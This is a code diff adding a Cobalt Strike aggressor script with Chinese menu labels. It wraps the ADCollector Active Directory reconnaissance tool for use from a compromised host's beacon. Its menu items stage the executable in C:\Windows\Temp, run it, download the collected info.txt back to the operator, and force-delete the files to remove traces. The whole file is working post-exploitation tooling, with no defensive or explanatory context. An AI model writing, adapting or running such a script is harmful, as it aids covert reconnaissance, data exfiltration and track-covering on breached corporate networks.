@@ -1,0 +1,29 @@
+popup beacon_bottom {
+	menu "ADCollector" {
+		item "上传脚本" {
+			$bid = $1;
+			$dialog = dialog("上传ADCollector", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &adc_up);
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub adc_up {
+		    bcd($bid, $3['UploadPath']);
+	        bupload($bid, script_resource("ADCollector.exe"));
+		}
+		item "运行脚本"{
+			bshell($1, "ADCollector.exe");
+		}
+		item "下载结果" {
+			blog($1, "[*] Download Result...");
+			bdownload($1, "info.txt");
+		}
+		item "清除文件" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "del /f /s /q ADCollector.exe");
+				bshell($1, "del info.txt");
+			}
+		}
+	}
+}
